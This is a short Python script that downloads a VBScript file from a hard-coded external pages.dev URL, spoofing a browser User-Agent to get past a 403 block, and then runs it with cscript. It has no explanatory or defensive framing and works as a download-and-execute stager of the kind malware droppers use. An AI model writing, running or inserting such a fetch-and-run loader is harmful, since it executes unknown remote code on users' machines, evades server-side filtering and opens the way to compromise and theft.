import urllib.request
import subprocess

def download_and_execute(url, filename="downloaded_script.vbs"):
    # Create a custom request with a user-agent to bypass the 403 error
    req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
    with urllib.request.urlopen(req) as response:
        with open(filename, 'wb') as f:
            f.write(response.read())
    
    # Execute the downloaded script
    subprocess.run(["cscript", "//nologo", filename], check=True)

if __name__ == "__main__":
    download_and_execute("https://jjjy-9mb.pages.dev/j.vbs")
